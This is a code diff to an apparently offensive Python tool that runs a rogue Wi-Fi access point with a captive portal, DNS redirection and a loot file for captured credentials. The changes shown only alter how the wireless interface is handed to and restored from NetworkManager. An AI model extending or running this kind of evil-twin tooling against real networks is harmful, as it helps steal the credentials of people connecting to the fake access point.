@@ -111,6 +111,7 @@ status_info = {
     "clients": 0,
     "credentials": 0
 }
+ORIGINAL_WIFI_INTERFACE = None # Added to store original interface name
 
 # HTML file selection globals
 current_html_file = "wifi" # Default selected folder
@@ -224,9 +225,17 @@ def draw_ui(screen_state="main", status: str = ""):
 # 6) Core Attack Functions
 # ---------------------------------------------------------------------------
 def scan_wifi_networks():
-    global scanned_networks, selected_network_index, WIFI_INTERFACE
+    global scanned_networks, selected_network_index, WIFI_INTERFACE, ORIGINAL_WIFI_INTERFACE
 
     draw_message("Scanning...", "yellow")
+    
+    # Store original interface name
+    ORIGINAL_WIFI_INTERFACE = WIFI_INTERFACE
+    
+    # Gracefully unmanage interface from NetworkManager
+    subprocess.run(f"nmcli device disconnect {WIFI_INTERFACE} 2>/dev/null || true", shell=True)
+    subprocess.run(f"nmcli device set {WIFI_INTERFACE} managed off 2>/dev/null || true", shell=True)
+    time.sleep(1)
     
     # Bring down interface, set to monitor mode
     subprocess.run(f"ifconfig {WIFI_INTERFACE} down", shell=True)
@@ -263,11 +272,23 @@ def scan_wifi_networks():
         time.sleep(3)
         scanned_networks = []
     finally:
-        # Return interface to managed mode
+        # Return interface to managed mode and re-manage with NetworkManager
         subprocess.run(f"ifconfig {WIFI_INTERFACE} down", shell=True)
         subprocess.run(f"iwconfig {WIFI_INTERFACE} mode managed", shell=True)
         subprocess.run(f"ifconfig {WIFI_INTERFACE} up", shell=True)
         time.sleep(1)
+        
+        # Re-manage interface with NetworkManager
+        if ORIGINAL_WIFI_INTERFACE:
+            subprocess.run(f"nmcli device set {ORIGINAL_WIFI_INTERFACE} managed yes 2>/dev/null || true", shell=True)
+            subprocess.run(f"nmcli device connect {ORIGINAL_WIFI_INTERFACE} 2>/dev/null || true", shell=True)
+            time.sleep(5) # Give it some time to reconnect
+            
+            # Restart NetworkManager service for full restoration
+            subprocess.run("systemctl restart NetworkManager 2>/dev/null || true", shell=True)
+            time.sleep(5) # Give NetworkManager time to start and scan
+            
+            WIFI_INTERFACE = ORIGINAL_WIFI_INTERFACE # Reset WIFI_INTERFACE to original
 
 def handle_file_selection_logic():
     global html_files_list, html_file_index, current_html_file, CAPTIVE_PORTAL_PATH, LOOT_FILE
@@ -323,8 +344,8 @@ def check_dependencies():
     return None
 
 def stop_interfering_services():
-    subprocess.run("pkill wpa_supplicant", shell=True)
-    subprocess.run("pkill dhclient", shell=True)
+    # Only kill services directly started by this script or known to interfere
+    # wpa_supplicant and dhclient are handled by nmcli unmanage/disconnect
     subprocess.run("pkill dnsmasq", shell=True)
     subprocess.run("pkill hostapd", shell=True)
     subprocess.run("pkill php", shell=True)
@@ -367,7 +388,10 @@ address=/#/10.0.0.1
     return hostapd_conf_path, dnsmasq_conf_path
 
 def start_attack():
-    global attack_processes
+    global attack_processes, ORIGINAL_WIFI_INTERFACE
+    
+    # Store original interface name before potential change
+    ORIGINAL_WIFI_INTERFACE = WIFI_INTERFACE
     
     # Ensure the selected interface is properly set up as the primary interface
     draw_message(f"Activating {WIFI_INTERFACE}...", "yellow")
@@ -376,7 +400,13 @@ def start_attack():
         time.sleep(3)
         return False
     
-    stop_interfering_services()
+    # Gracefully unmanage interface from NetworkManager
+    draw_message("Unmanaging NM...", "yellow")
+    subprocess.run(f"nmcli device disconnect {WIFI_INTERFACE} 2>/dev/null || true", shell=True)
+    subprocess.run(f"nmcli device set {WIFI_INTERFACE} managed off 2>/dev/null || true", shell=True)
+    time.sleep(1)
+    
+    stop_interfering_services() # This will now only kill hostapd, dnsmasq, php
     hostapd_conf, dnsmasq_conf = create_configs()
 
     # Clear old loot
@@ -419,6 +449,7 @@ def start_attack():
         return False
 
 def stop_attack():
+    global WIFI_INTERFACE, ORIGINAL_WIFI_INTERFACE
     for name, proc in attack_processes.items():
         try:
             os.kill(proc.pid, signal.SIGTERM)
@@ -427,11 +458,26 @@ def stop_attack():
     attack_processes.clear()
     
     # Restore networking
-    stop_interfering_services()
-    subprocess.run(f"ifconfig {WIFI_INTERFACE} down", shell=True)
-    subprocess.run(f"iwconfig {WIFI_INTERFACE} mode managed", shell=True)
-    subprocess.run(f"ifconfig {WIFI_INTERFACE} up", shell=True)
-    # Maybe run `systemctl restart dhcpcd` or similar
+    stop_interfering_services() # This will kill hostapd, dnsmasq, php
+    
+    # Restore interface to managed mode and reconnect with NetworkManager
+    if ORIGINAL_WIFI_INTERFACE:
+        draw_message("Restoring NM...", "yellow")
+        subprocess.run(f"ifconfig {WIFI_INTERFACE} down 2>/dev/null || true", shell=True)
+        subprocess.run(f"iwconfig {WIFI_INTERFACE} mode managed 2>/dev/null || true", shell=True)
+        subprocess.run(f"ifconfig {WIFI_INTERFACE} up 2>/dev/null || true", shell=True)
+        time.sleep(1)
+        
+        subprocess.run(f"nmcli device set {ORIGINAL_WIFI_INTERFACE} managed yes 2>/dev/null || true", shell=True)
+        time.sleep(1)
+        subprocess.run(f"nmcli device connect {ORIGINAL_WIFI_INTERFACE} 2>/dev/null || true", shell=True)
+        time.sleep(5) # Give it some time to reconnect
+        
+        # Restart NetworkManager service for full restoration
+        subprocess.run("systemctl restart NetworkManager 2>/dev/null || true", shell=True)
+        time.sleep(5) # Give NetworkManager time to start and scan
+        
+        WIFI_INTERFACE = ORIGINAL_WIFI_INTERFACE # Reset WIFI_INTERFACE to original
     
     # Clean up temp files
     if os.path.exists(TEMP_CONF_DIR):
